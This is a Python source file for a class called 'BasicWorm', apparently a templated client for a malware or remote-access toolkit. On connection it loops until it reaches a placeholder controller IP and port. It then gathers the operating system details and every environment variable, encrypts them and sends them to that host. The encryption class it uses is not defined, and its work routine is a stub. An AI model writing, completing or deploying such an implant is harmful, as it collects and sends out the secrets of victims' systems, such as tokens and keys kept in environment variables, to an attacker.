


import socket
import platform
import os
import threading


from time import sleep
from threading import Thread
from typing import Union



class BasicWorm:
    def __init__(self):
        self.name = "BasicWorm"
        self.ip = "{{IP}}"
        self.port = {{PORT}}
        self.addr = (self.ip, self.port)
        self.format = "{{FORMAT_CODE}}"
        self.raw_len = {{RAW_LEN}}
        self.Cham = Chameleon(self.format)
        self.pause_conn = 3
        self.sys_msg = "{{MSG_SYS_HEADERS}}"
        self._sendLock = threading.Lock()
        self._sysInfo = "Unknown"
        self._sysEnv = "Unknown"
    

    def buildSocket(self) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Socket Build")
            return True
        except OSError:
            return False
    
    def connect(self) -> bool:
        try:
            self.socket.connect(self.addr)
            print("Connected")
            return True
        except ConnectionRefusedError:
            print("Odrzucono połączenie")
            return False
        except:
            return False
    
    def closeSocket(self) -> None:
        try:
            self.socket.close()
        except:
            pass
    
    def sendMsg(self, msg : str) -> None:
        try:
            msg = self.Cham.encrypt(msg)
        except:
            return
        try:
            with self._sendLock:
                self.socket.sendall(msg)
        except:
            return


    def reciveMsg(self) -> Union[str, bool]:
        msg = b""
        while True:
            try:
                recv = self.socket.recv(self.raw_len)
            except:
                return None
            if recv:
                if len(recv) < self.raw_len:
                    msg += recv
                    break
                else:
                    msg += recv
            else:
                return None
        try:
            msg = self.Cham.decrypt(msg)
            return msg
        except:
            return " "       
    

    def makeSysMsg(self, cmd : list) -> str:
        msg = self.sys_msg + self.sys_msg.join(cmd) + self.sys_msg
        return msg
    

    def getSysInfo(self) -> None:
        self._sysInfo = f"{platform.system()} ## {platform.release()}"
        self._sysEnv = os.environ
        try:
            env = ""
            for k,i in self._sysEnv.items():
                env += f"\n{k}  --  {i}"
        except:
            env = "Unknown"
        info = ["i", self.name, self._sysInfo, env]
        info = self.makeSysMsg(info)
        self.sendMsg(info)
    

    def START(self) -> None:
        while True:
            if not self.buildSocket():
                sleep(self.pause_conn)
                continue
            if not self.connect():
                sleep(self.pause_conn)
                self.closeSocket()
                continue
            self.getSysInfo()
            if self.Work():
                continue
            sleep(1)
            print("Close Client")
            self.closeSocket()
            break

              
    def Work(self) -> bool:
        sleep(3)
        return False
